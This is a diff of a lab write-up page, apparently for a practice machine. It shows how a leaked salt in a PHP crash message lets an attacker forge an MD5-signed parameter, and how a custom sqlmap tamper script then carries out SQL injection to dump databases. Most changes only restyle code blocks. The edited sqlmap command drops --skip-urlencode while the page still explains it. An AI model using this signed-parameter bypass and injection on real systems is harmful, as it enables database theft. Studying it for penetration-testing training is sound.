@@ -106,6 +106,7 @@
     <link rel="stylesheet" href="/css/coder-dark.min.01ce5a59759539162fb20573a28d9572f4f718f648ae0c0cb12d0b09bea975bc.css" integrity="sha256-Ac5aWXWVORYvsgVzoo2VcvT3GPZIrgwMsS0LCb6pdbw=" crossorigin="anonymous" media="screen" />
   
 
+    <link rel="stylesheet" href="/css/prism.css"/>
 
 
       <meta property="og:image" content="/sqlmap.png" />
@@ -190,6 +191,7 @@
   </section>
 </nav>
 
+<script src="/js/prism.js"></script>
 
 <div class="content">
     <section class="container ">
@@ -214,7 +216,7 @@
           </li>
             <li>
                 Tamper Python script template:
-                <pre><code class="code-style">
+                <pre><code class="language-python">
     # Needed imports
     from lib.core.enums import PRIORITY
 
@@ -250,7 +252,7 @@
             </li>
             <li>
                 So, to enumerate &amp; dump with sqlmap in this case, we need to write a simple custom tamper script as follows:
-                <pre><code class="code-style">
+                <pre><code class="language-python">
     #!/usr/bin/env python
     from lib.core.enums import PRIORITY
     import re
@@ -281,7 +283,7 @@
             </li>
             <li>
                 The response is the HTML for the <strong>various products part</strong> of the page:
-                <pre><code class="code-style">
+                <pre><code class="language-http">
     HTTP/1.1 200 OK
     Content-Type: text/html; charset=UTF-8
     Server: Microsoft-IIS/10.0
@@ -305,7 +307,7 @@
             </li>
             <li>
                 The first thought, in this case, is to hash <code class="code-style">id desc</code> using <strong>MD5</strong>, but it doesn’t match:
-                <pre><code class="code-style">
+                <pre><code class="language-bash">
     echo -n "id desc" | md5sum
     aa5a97b10a6dd87160868d2316ab2425  -
                 </code></pre>
@@ -315,7 +317,7 @@
             </li>
             <li>
                 But when <code class="code-style">h</code> is removed, it results in another <strong>500</strong> error but with crash info:
-                <pre><code class="code-style">
+                <pre><code class="language-php">
     &lt;!-- [8] Undefined index: h
     On line 6 in file C:\inetpub\wwwroot\products-ajax.php
     1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php
@@ -338,12 +340,12 @@
             </li>
             <li>
                 So now let’s try to guess the salt combination with the <code class="code-style">order</code> parameter:
-                <pre><code class="code-style">
+                <pre><code class="language-bash">
     echo -n "hie0shah6ooNoimid desc" | md5sum
     a1b30d31d344a5a4e41e8496ccbdd26b  -
                 </code></pre>
                 and it matches the initial value of <code class="code-style">h</code> in the AJAX request, so we can start testing SQLi with this encryption process as:
-                <pre><code class="code-style">
+                <pre><code class="language-bash">
     root@kali$ echo -n "hie0shah6ooNoimid desc'" | md5sum
     242d281d06a8d273e24a2fc7a3d89d08  -
     root@kali$ curl -I 'http://10.10.10.231/products-ajax.php?order=id+asc&amp;h=242d281d06a8d273e24a2fc7a3d89d08'
@@ -368,7 +370,7 @@
             </li>
             <li>
                 The trick here is that the return of the tamper script will be added to each injectable parameter in the request. After troubleshooting by using <code class="code-style">--proxy</code> to see sqlmap traffic through Burp History, I finally came up with this simple script:
-                <pre><code class="code-style">
+                <pre><code class="language-python">
     #!/usr/bin/env python
     from lib.core.enums import PRIORITY
     from hashlib import md5
@@ -385,16 +387,16 @@
             </li>
             <li>
                 Then exploit with the following sqlmap command:
-                <pre><code class="code-style">
-    sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc" --tamper=/customtamper/custom_tamper.py --skip-urlencode --dbs
+                <pre><code class="language-bash">
+    sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc" --tamper=/customtamper/custom_tamper.py --dbs
                 </code></pre>
             </li>
             <li>
-                As we can notice in the sqlmap command, I removed the <code class="code-style">h</code> parameter, which will be added with the custom values generated through our tamper script.		    
-            </li>
-            <li>
-                <code class="code-style">--skip-urlencode</code> option to avoid <code class="code-style">h</code> parameter from being a part from the encoded payload, and be a separated parameter as required		    
-            </li>
+              As we can notice in the sqlmap command, I removed the <code class="code-style">h</code> parameter, which will be added with the custom values generated through our tamper script.		    
+          </li>
+          <li>
+              <code class="code-style">--skip-urlencode</code> option to avoid <code class="code-style">h</code> parameter from being a part from the encoded payload, and be a separated parameter as required		    
+          </li>
         </ul>
         <h3>Refrences:</h3>
           <ul>
